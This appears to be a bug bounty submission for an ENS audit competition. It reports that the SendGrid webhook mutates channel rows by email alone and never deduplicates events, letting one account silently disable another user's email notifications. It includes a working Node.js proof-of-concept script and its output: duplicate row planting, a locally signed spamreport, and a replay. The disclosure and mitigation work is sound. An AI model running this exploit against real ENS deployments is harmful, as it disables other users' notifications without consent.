# 92398 w a medium unscoped replay unprotected sendgrid webhook over duplicate email rows lead to silent cross user disabling of ens email notifications

**Submitted on Sep 9th 2026 at 13:09:56 UTC by @Destiny0629 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92398
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Enabling/disabling notifications

## Description

## Brief/Intro

A SendGrid delivery event for a shared email address mutates whichever notification-channel row the database returns first including a different user's verified channel and with no replay or freshness check, the same signed request is re-processed on every re-delivery, so an attacker with only an ordinary account can silently and persistently disable another user's ENS email notifications

## Vulnerability Details

Affected component: `workers/api-worker` — the SendGrid event webhook (`src/app/routes/webhook/sendgrid.ts`, post-signature event processing), enabled by the cross-user duplicate-row gap in the channel-add flow (`src/app/routes/notifications/channels/email.ts`) over a per-user-only uniqueness constraint (`src/core/database/schema/notifications.ts`)

The root cause is a composition of three defects — one primary (mis-attribution), two that enable and sustain it:

1. **Unscoped, non-deterministic channel resolution.** For every event, the webhook resolves the row to mutate with `db.query.userChannels.findFirst({ where: eq(TABLE.userChannels.target, event.email) })` — keyed by the email address **only**: no `user_id` filter, no `channel = 'email'` filter, and no `orderBy`. It then writes `status = 'bounced'`/`'unsubscribed'`, `status_reason`, and `last_bounce_at` onto whatever row that call returns. A SendGrid event carries no channel or user identifier, so a delivery that pertains to one user's channel is applied to whatever row shares that email — potentially a different user's
2. **Attacker-plantable duplicate rows.** The channel-add flow's cross-user guard rejects a second account's identical email only when the other account's row is already `status = 'verified'` (`email.ts` — `findFirst(and(channel='email', target=email, status='verified'))` → 400 only if `user_id` differs). While a target's row is still `pending` — or before the target ever adds the address — any authenticated account may add the same address, and the DB uniqueness key is per-`(user_id, channel, target)` (`notifications.ts` — `unique('user_channel_unique').on(user_id, channel, target)`). Two rows for one email, owned by two different users, therefore coexist legitimately, and the planted (pending) row persists even after the target verifies theirs
3. **No replay / freshness protection.** The webhook's ECDSA verification is correct (fails closed when the key is unset, SPKI import, `timestamp + rawBody` P-256) and is **not** bypassed — but `sg_event_id` is never stored or de-duplicated, so a genuine signed event is re-processed every time it is delivered again — SendGrid's own at-least-once (duplicate) delivery, or a verbatim resend of a captured request. The timestamp is likewise never age-checked, so a captured request stays valid indefinitely (a replay months later is accepted identically)

This finding is not about forging events — the signature boundary holds. It is about what a genuine signed event (which SendGrid emits whenever any recipient of ENS mail bounces or reports spam, *including for the unsolicited ENS "Verify your email" message the plant itself sends to the target*) is then permitted to do, to whom, and for how long

Why existing checks do not prevent it: the cross-user guard is `verified`-only (defect 2 is precisely that gap); the webhook mutate by email with no user/channel scoping and no deterministic ordering (defect 1); and nothing bounds re-processing (defect 3). No admin role, no leaked key and no signature forgery is involved — only a self-service account plus the target's email address

## Exploit scenerio;

1. Attacker create an ordinary account (SIWE login — permissionless) and calls `POST /notifications/channels/email {"email":"<target@example.com>"}` while the target's own row for that address is still `pending`, or before the target has added it. Two rows for one email now exist — one owned by the attacker, one (to be) owned by the target. The target's mailbox receives an ENS-branded "Verify your email" message it did not request.
2. The target verifies their own row through normal usage → the target's channel is `verified`; the attacker's row stays `pending` (Both rows share the same `target` email; they differ only by `user_id` and `status`.)
3. A genuine SendGrid event for that email reaches `POST /webhook/sendgrid/events` — e.g. because the target reports the unsolicited ENS verification mail (or any ENS mail) as spam, or because ENS mail to that address bounces. The attacker does not forge this event; SendGrid signs and delivers it.
4. The webhook resolves the channel by email alone (`findFirst(target=email)`) and writes `status = 'bounced'` (`status_reason = "User reported as spam"`) to whichever row the database returns — which can be the **target's verified channel** — silently disabling their notification delivery, with no wallet interaction and no signature forgery, and, when the recipient's mail provider bounces or spam-filters the attacker-induced message, no action by the target at all
5. Because there is no replay or freshness check, the same signed request is accepted on every re-delivery (SendGrid's at-least-once duplicate delivery, or a verbatim resend of a captured request). Since channel resolution is non-deterministic (row ordering shifts as rows are updated), successive re-deliveries of that one signed event land on different rows sharing the email driving the target's verified channel to `bounced` and holding it there (a later re-verify is simply bounced again)

## Impact

**Medium** : a permissionless account, with no wallet interaction and no signature forgery, silently mark another user's verified email notification channel `bounced`/`unsubscribed` (disabling their ENS notifications), and the missing replay protection sustain it — the strictly no-interaction (Critical) variant would additionally require capturing a delivered webhook request to replay, so Medium is the claimed tier

## References

* `workers/api-worker/src/app/routes/webhook/sendgrid.ts` — `processEvents`: `findFirst({ where: eq(TABLE.userChannels.target, event.email) })` (unscoped, no ordering) and the `status='bounced'/'unsubscribed'` writes; the handler performs no timestamp freshness check and no `sg_event_id` de-duplication.
* `workers/api-worker/src/app/routes/notifications/channels/email.ts` — the cross-user guard fires only for `status='verified'` rows (permits a duplicate `pending` row for another user's email).
* `workers/api-worker/src/core/database/schema/notifications.ts` — `unique('user_channel_unique').on(user_id, channel, target)` (per-user uniqueness permits two rows for one email).

## Recommended Mitigation Steps

The single change that close the cross-user impact is correct event attribution:

* Stamp a per-send id (`sg_message_id` or a `custom_args` channel id) on the outgoing mail and resolve the webhook by that id, not by `target` email. For legacy events with no id, act only when the address maps to a single channel; skip when several share it

Then harden the two enabling defects:

* Deduplicate on `sg_event_id`; reject stale timestamps
* One verified channel per address, enforced at verification time, not add time — an add-time check lets an attacker pre-claim an address and lock out its real owner

## Proof of Concept

## Proof of Concept

Place the script below as `workers/api-worker/poc-dualrow.mjs` and run `node poc-dualrow.mjs` against the local api-worker on `http://localhost:2999`

Setup: `docker compose up -d` (Postgres), `pnpm exec drizzle-kit push --force`, `pnpm dev:vite`; in `.dev.vars` set a working `SEPOLIA_RPC_URL` (SIWE does an `eth_getCode`), the neon `DATABASE_URL`, `JWT_SECRET`, a dummy `SENDGRID_API_KEY` and `SENDGRID_WEBHOOK_VERIFICATION_KEY` = the base64 SPKI public half of the P-256 key the PoC signswith (`poc-priv.pem`). `psql` only stand in for the mailbox click and the final-state read

```javascript
// poc-dualrow.mjs — attacker plants a duplicate pending row for the target's email; the target
// verifies their OWN (VERIFIED) row; a genuine signed spamreport plus its (unprotected) replay
// flip a cross-user row for the shared email — the target's VERIFIED channel ends bounced.
// Fresh random EOAs (clean addresses, no on-chain code) so SIWE uses plain ECDSA recovery.
import { createSign, createPrivateKey } from 'node:crypto'
import { execSync } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'

const API = 'http://localhost:2999'
const DB = 'postgresql://postgres:postgres@localhost:5432/postgres'
const EMAIL = `victim-${Date.now()}@poc-box.test`
const key = createPrivateKey(readFileSync('poc-priv.pem', 'utf8'))

const psql = (sql) => execSync(`psql "${DB}" -tAc "${sql.replace(/"/g, '\\"')}"`).toString().trim()

async function login(account) {
  const { nonce } = await (await fetch(`${API}/auth/nonce`, { method: 'POST' })).json()
  const message =
    `app.ens.dev wants you to sign in with your Ethereum account:\n${account.address}\n\n` +
    `Sign in to ENS\n\nURI: https://app.ens.dev\nVersion: 1\nChain ID: 11155111\n` +
    `Nonce: ${nonce}\nIssued At: ${new Date().toISOString()}`
  const signature = await account.signMessage({ message })
  const b = await (await fetch(`${API}/auth/login`, { method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ address: account.address, message, signature, nonce }) })).json()
  if (!b.token) throw new Error('login failed: ' + JSON.stringify(b))
  return b.token
}
const addEmail = async (token) => (await fetch(`${API}/notifications/channels/email`, { method: 'POST',
  headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' }, body: JSON.stringify({ email: EMAIL }) })).status
const sign = (payload, ts = Math.floor(Date.now() / 1000).toString()) =>
  ({ sig: createSign('SHA256').update(ts + payload).sign({ key, dsaEncoding: 'ieee-p1363' }).toString('base64'), ts })
const fireWebhook = async (label, payload, { sig, ts } = {}) => {
  const r = await fetch(`${API}/webhook/sendgrid/events`, { method: 'POST',
    headers: { 'Content-Type': 'application/json',
      ...(sig ? { 'X-Twilio-Email-Event-Webhook-Signature': sig, 'X-Twilio-Email-Event-Webhook-Timestamp': ts } : {}) },
    body: payload })
  console.log(label, '->', r.status, (await r.text()).slice(0, 80))
}
const dump = (tag) => console.log(tag, '\n' + psql(
  `select substr(u.address,1,10) as owner, c.status from user_channels c join users u on u.id=c.user_id where c.target='${EMAIL}' order by u.address`))

const victim = privateKeyToAccount(generatePrivateKey())
const attacker = privateKeyToAccount(generatePrivateKey())
console.log('victim  =', victim.address, '\nattacker=', attacker.address, '\nemail   =', EMAIL, '\n')

const victimTok = await login(victim)
const attackerTok = await login(attacker)

// 1) victim adds (pending). 2) attacker plants a duplicate PENDING row (verified-only guard allows it).
//    Both HTTP calls return 500 on the dummy SendGrid key AFTER the rows are written (writes precede
//    the send) — the rows persist, which is all the attack needs.
console.log('victim add  ->', await addEmail(victimTok))
console.log('attacker add->', await addEmail(attackerTok))
dump('after plant (two rows, one email, two users):')

// 3) victim verifies THEIR OWN row via its token (stands in for clicking the mailbox link).
const victimUserId = psql(`select id from users where lower(address)=lower('${victim.address}')`)
const token = psql(`select cv.token from channel_verifications cv join user_channels c on c.id=cv.channel_id ` +
  `where c.target='${EMAIL}' and c.user_id='${victimUserId}' order by cv.expires_at desc limit 1`)
const vr = await fetch(`${API}/notifications/channels/email/verify`, { method: 'POST',
  headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token }) })
console.log('\nvictim verify ->', vr.status, (await vr.text()).slice(0, 60))
dump('after victim verify (victim VERIFIED, attacker pending):')

// 4) genuine signed spamreport for the shared email.
const ev = JSON.stringify([{ email: EMAIL, event: 'spamreport', timestamp: Math.floor(Date.now() / 1000), sg_event_id: 'evt-1' }])
console.log('')
await fireWebhook('(a) valid signed spamreport', ev, sign(ev))
dump('after event #1:')

// 5) replay the same signed event (same sg_event_id) — no dedup, so it is re-processed and re-applied.
//    (A real attacker without SendGrid's key cannot re-sign; they resend a captured request verbatim,
//     which is byte-for-byte this same accepted request — the timestamp is never age-checked either.)
await fireWebhook('(b) replay (same event id, re-submitted)', ev, sign(ev))
dump('final state (bounced sustained across replay):')

// 6) controls: signature boundary intact (no mutation).
console.log('')
await fireWebhook('(d) control: no signature headers', ev)
await fireWebhook('(e) control: garbage signature', ev, { sig: Buffer.from('nope').toString('base64'), ts: '1' })
```

```bash
$ node poc-dualrow.mjs
victim  = 0x9f0477367d066BbB439C96Bd6b4c342825347343
attacker= 0x1FE754013B5F8A9b5182bF55b1dC91C56892444f
email   = victim-1788948964219@poc-box.test

victim add  -> 500
attacker add-> 500
after plant (two rows, one email, two users):
0x1fe75401|pending
0x9f047736|pending
                          <- both rows persist despite the 500 (writes precede the SendGrid send)

victim verify -> 200 {"message":"Email verified successfully"}
after victim verify (victim VERIFIED, attacker pending):
0x1fe75401|pending        <- attacker (planted)
0x9f047736|verified       <- victim (their real channel)

(a) valid signed spamreport -> 200 {"ok":true}
after event #1:
0x1fe75401|bounced        <- unordered findFirst hit a cross-user row (here the attacker's)
0x9f047736|verified
(b) replay (same event id, re-submitted) -> 200 {"ok":true}       <- same sg_event_id accepted again; no dedup
final state (bounced sustained across replay):
0x1fe75401|bounced
0x9f047736|bounced        <- the VICTIM's VERIFIED channel is now bounced — notifications disabled

(d) control: no signature headers -> 401 {"error":"Missing signature headers"}
(e) control: garbage signature -> 401 {"error":"Invalid signature"}
```
